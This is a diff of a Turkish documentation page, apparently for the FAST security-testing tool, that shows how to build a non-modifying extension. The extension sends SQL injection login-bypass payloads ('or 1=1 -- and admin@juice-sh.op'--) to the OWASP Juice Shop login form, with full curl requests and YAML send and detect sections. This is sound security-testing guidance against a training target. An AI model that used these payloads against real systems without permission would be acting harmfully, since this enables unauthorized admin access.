@@ -1,76 +1,74 @@
-[link-meta-info]:           ../create-extension.md#structure-of-the-meta-info-section
-[link-send-headers]:        ../phase-send.md#working-with-the-host-header
-[link-using-extension]:     ../using-extension.md
+[link-meta-info]:           ../create-extension.md#structure-of-the-meta-info-section  
+[link-send-headers]:        ../phase-send.md  
+[link-using-extension]:     ../using-extension.md  
 [link-app-examination]:     app-examination.md
 
-[doc-send-phase]:           ../phase-send.md
+[doc-send-phase]:           ../phase-send.md  
 [doc-detect-phase]:         ../detect/phase-detect.md
 
 [link-juice-shop]:          https://www.owasp.org/index.php/OWASP_Juice_Shop_Project
 
 
 
-#   Değiştirmeyen Uzantının Oluşturulması
+# Değişiklik Yapmayan Eklentinin Oluşturulması
 
-Bu belgede tarif edilen uzantı, bazı yükleri enjekte etmek için gelen temel isteği değiştirmeyecektir. Bunun yerine, iki önceden tanımlanmış test isteği, temel istekte belirtilen ana makineye gönderilecektir. Bu test istekleri, [“OWASP Juice Shop”][link-juice-shop] hedef uygulamasının giriş formundaki SQLi açıklığını istismar edebilecek yükleri içerir.
-
-
-##  Hazırlıklar
-
-FAST uzantısının oluşturulmasından önce hedef uygulamanın davranışını [incelemeniz][link-app-examination] şiddetle tavsiye edilir.
+Bu belgede tanımlanan eklenti, gelen temel isteğe bazı yükler enjekte etmek amacıyla değiştirilmez. Bunun yerine, temel istekte belirtilen ana makineye iki önceden tanımlanmış test isteği gönderilecektir. Bu test istekleri, hedef uygulamanın [“OWASP Juice Shop”][link-juice-shop] giriş formundaki SQLi açığının istismarına yol açabilecek yükleri içermektedir.
 
 
-##  Uzantının Oluşturulması
+## Hazırlıklar
 
-Uzantıyı tarif eden bir dosya oluşturun (`non-mod-extension.yaml`, örneğin) ve gerekli bölümlerle doldurun:
+FAST eklentisi oluşturulmadan önce, hedef uygulamanın davranışını [incelemeniz][link-app-examination] şiddetle tavsiye edilir.
 
-1.  [**`meta-info` bölümü**][link-meta-info].
 
-   Uzantının tespit etmeye çalışacağı açıklığın açıklamasını hazırlayın.
+## Eklenti Oluşturma
+
+Eklentiyi tanımlayan (ör., `non-mod-extension.yaml`) bir dosya oluşturun ve gerekli bölümlerle doldurun:
+
+1.  [**The `meta-info` section**][link-meta-info].
+
+    Eklentinin tespit etmeye çalışacağı açığın tanımını hazırlayın.
     
-    * açıklık başlığı: `OWASP Juice Shop SQLi (değiştirmeyen uzantı)`
-    * açıklık açıklaması: `OWASP Juice Shop'ta SQLi'nin Demosu (Yönetici Girişi)`
-    * açıklık türü: SQL injeksiyonu
-    * açıklık tehdit seviyesi: yüksek
+    * açık başlığı: `OWASP Juice Shop SQLi (non-mod extension)`
+    * açık açıklaması: `Demo of SQLi in OWASP Juice Shop (Admin Login)`
+    * açık türü: SQL injection
+    * açık tehdit seviyesi: yüksek
     
-    İlgili `meta-info` bölümü şöyle görünmelidir:
+    İlgili `meta-info` bölümünün görünümü aşağıdaki gibidir:
     
     ```
     meta-info:
       - type: sqli
       - threat: 80
-      - title: 'OWASP Juice Shop SQLi (değiştirmeyen uzantı)'
-      - description: 'OWASP Juice Shop'ta SQLi'nin Demosu (Yönetici Girişi)'
+      - title: 'OWASP Juice Shop SQLi (non-mod extension)'
+      - description: 'Demo of SQLi in OWASP Juice Shop (Admin Login)'
     ```
     
-2.  **`send` bölümü, [Gönderme aşaması][doc-send-phase]**
+2.  **The `send` section, the [Send phase][doc-send-phase]**
 
-   Hedef uygulamadaki SQL injeksiyon açıklığını istismar etmek için herhangi bir `şifre` değeriyle birlikte `email` parametre değeri olarak gönderilmesi gereken iki yük vardır:
+    Hedef uygulamadaki SQL injection açığını istismar etmek için, herhangi bir `password` değeri ile birlikte `email` parametresi değeri olarak gönderilmesi gereken iki payload bulunmaktadır:
     
-    * `'veya 1=1 --`
+    * `'or 1=1 --`
     * `admin@juice-sh.op'--`
     
-   Bu iki yükte, 
-
-    * yukarıda tarif edilen değerlerden biriyle `email` parametresi ve 
-    * keyfi bir değerle `şifre` parametresi 
-
-    içeren iki test isteği oluşturabilirsiniz.
+    İki test isteği oluşturabilirsiniz; her biri:
     
-    Bu isteklerden birini örnek hedef uygulamamızı (OWASP Juice Shop) test etmek için kullanmak yeterlidir.
-    
-    Ancak, bir gerçek uygulamanın güvenlik testini gerçekleştirirken birkaç hazırlanmış test isteği setine sahip olmak yararlı olabilir: isteklerden biri artık uygulamanın güncellemeleri ve iyileştirmeleri sayesinde bir açıklığı istismar edemezse, diğer test istekleri hala kullanılan diğer yükler nedeniyle açıklığı istismar edebilir olabilir.
-   
-    Yukarıdaki listedeki ilk yükle benzer bir istek şöyledir:
+    * Yukarıda tanımlanan değerlerden biriyle `email` parametresine sahip ve 
+    * Rasgele bir değerle `password` parametresine sahip olacaktır.
 
+    Örnek hedef uygulama (OWASP Juice Shop) üzerinde test gerçekleştirmek için bu isteklerden yalnızca birini kullanmak yeterlidir.
+    
+    Ancak, gerçek bir uygulamanın güvenlik testleri sırasında, birkaç hazır test isteğine sahip olmak faydalı olabilir: Uygulamadaki güncellemeler ve iyileştirmeler nedeniyle isteklerden biri artık bir açığı istismar edemiyorsa, diğer payload'lar sayesinde açığı hala istismar edebilecek başka test istekleri mevcut olacaktır.
+
+    Yukarıdaki listedeki ilk payload içeren istek aşağıdakine benzer:
+    
     ```
     curl --request POST --url http://ojs.example.local/rest/user/login \
          --header 'content-type: application/json' \
          --header 'host: ojs.example.local' \
-         --data '{"email":"'\''veya 1=1 --", "password":"12345"}'
+         --data '{"email":"'\''or 1=1 --", "password":"12345"}'
     ```
 
-    İkinci istek birincisine benzer:
+    İkinci istek de ilkine benzer:
 
     ```
     curl --request POST --url http://ojs.example.local/rest/user/login \
@@ -79,15 +77,15 @@ Uzantıyı tarif eden bir dosya oluşturun (`non-mod-extension.yaml`, örneğin)
          --data '{"email":"admin@juice-sh.op'\''--", "password":"12345"}'
     ```
 
-    Bu iki test isteğinin tariflerini içeren `send` bölümünü ekleyin:
-
+    Bu iki test isteğinin açıklamalarını içeren `send` bölümünü ekleyin:
+    
     ```
     send:
       - method: 'POST'
         url: '/rest/user/login'
         headers:
         - 'Content-Type': 'application/json'
-        body: '{"email":"''veya 1=1 --","password":"12345"}'
+        body: '{"email":"''or 1=1 --","password":"12345"}'
       - method: 'POST'
         url: '/rest/user/login'
         headers:
@@ -95,28 +93,28 @@ Uzantıyı tarif eden bir dosya oluşturun (`non-mod-extension.yaml`, örneğin)
         body: '{"email":"admin@juice-sh.op''--","password":"12345"}'
     ``` 
     
-   !!! info "`Host` başlığı hakkında bir not" 
-       Bu özellikli SQLi açıklığının istismarını etkilemediği için bu isteklerde `Host` başlığını çıkarabilirsiniz. Bir FAST node, gelen temel isteklerden çıkarılan `Host` başlığını otomatik olarak ekleyecektir.
+    !!! info "Bir Not: `Host` Header Hakkında" 
+        Bu isteklerde `Host` header atlanabilir çünkü bu belirli SQLi açığının istismarını etkilemez. Bir FAST düğümü, gelen temel isteklerden çıkarılan `Host` header'ı otomatik olarak ekleyecektir.
         
-       Gönderme aşamasının istek başlıklarını nasıl ele aldığı hakkında [burada][link-send-headers] okuyun.
+        Send aşamasının istek header'larını nasıl işlediğini [buradan][link-send-headers] okuyabilirsiniz.
 
-     3.  **`detect` bölümü, [Tespit aşaması][doc-detect-phase]**.
+3.  **The `detect` section, the [Detect phase][doc-detect-phase]**
     
-    Aşağıdaki koşullar yönetici haklarıyla kullanıcı kimlik doğrulamasının başarılı olduğunu gösterir:
+    Aşağıdaki koşullar, yönetici haklarıyla kullanıcı doğrulamasının başarılı olduğunu gösterir:
     
-    * Yanıt gövdesinde `1` değeriyle alışveriş sepeti tanımlayıcısı parametresinin varlığı. Parametre, aşağıda gösterildiği gibi JSON formatında olmalıdır:
-
+    * Yanıt gövdesinde, `1` değeriyle alışveriş sepeti tanımlayıcı parametresinin bulunması. Parametre JSON formatındadır ve aşağıdaki gibi görünmelidir:
+    
         ```
         "bid":1
         ```
     
-    * Yanıt gövdesinde `admin@juice-sh.op` değeriyle kullanıcı email parametresinin varlığı. Parametre, aşağıda gösterildiği gibi JSON formatında olmalıdır:
-
+    * Yanıt gövdesinde, `admin@juice-sh.op` değeriyle kullanıcı e-posta parametresinin bulunması. Parametre JSON formatındadır ve aşağıdaki gibi görünmelidir:
+    
         ```
-        "umail":"admin@juice-sh.op"
+         "umail":"admin@juice-sh.op"
         ```
     
-    Yukarıda tarif edilen koşullara göre saldırının başarılı olup olmadığını kontrol eden `detect` bölümünü ekleyin.
+    Yukarıda tanımlanan koşullara göre saldırının başarılı olup olmadığını kontrol eden `detect` bölümünü ekleyin.
     
     ```
     detect:
@@ -124,28 +122,28 @@ Uzantıyı tarif eden bir dosya oluşturun (`non-mod-extension.yaml`, örneğin)
         - body: "\"umail\":\"admin@juice-sh.op\""
         - body: "\"bid\":1"
     ```
+    
+!!! info "Özel Karakterlerin Kaçırılması"  
+    Dizgilerdeki özel karakterlerin kaçırılmasını unutmayın.
 
-!!! info "Özel sembolleri kaçış karakteri ile kullanma"
-    Stringlerdeki özel sembolleri kaçış karakteri ile kullanmayı unutmayın.
+## Eklenti Dosyası
 
-##  Uzantı Dosyası
-
-Şimdi `non-mod-extension.yaml` dosyası uzantının işlemesi için gerekli bölümler setini içeriyor. Dosyanın içeriğinin listesi aşağıda gösterilmiştir:
+Artık `non-mod-extension.yaml` dosyası, eklentinin çalışması için gereken tüm bölümleri içeren eksiksiz bir yapıya sahiptir. Dosya içeriğinin listesi aşağıda gösterilmiştir:
 
 ??? info "non-mod-extension.yaml"
     ```
     meta-info:
       - type: sqli
       - threat: 80
-      - title: 'OWASP Juice Shop SQLi (değiştirmeyen uzantı)'
-      - description: 'OWASP Juice Shop'ta SQLi'nin Demosu (Yönetici Girişi)'
+      - title: 'OWASP Juice Shop SQLi (non-mod extension)'
+      - description: 'Demo of SQLi in OWASP Juice Shop (Admin Login)'
 
     send:
       - method: 'POST'
         url: '/rest/user/login'
         headers:
         - 'Content-Type': 'application/json'
-        body: '{"email":"''veya 1=1 --","password":"12345"}'
+        body: '{"email":"''or 1=1 --","password":"12345"}'
       - method: 'POST'
         url: '/rest/user/login'
         headers:
@@ -158,6 +156,6 @@ Uzantıyı tarif eden bir dosya oluşturun (`non-mod-extension.yaml`, örneğin)
         - body: "\"bid\":1"
     ```
 
-##  Uzantının Kullanımı
+## Eklentiyi Kullanma
 
-Oluşturulan ifadenin nasıl kullanılacağı hakkında ayrıntılı bilgi için, [bu belgeyi][link-using-extension] okuyun.
+Oluşturulan eklentinin nasıl kullanılacağı hakkında detaylı bilgi için, [bu belgeyi][link-using-extension] okuyun.
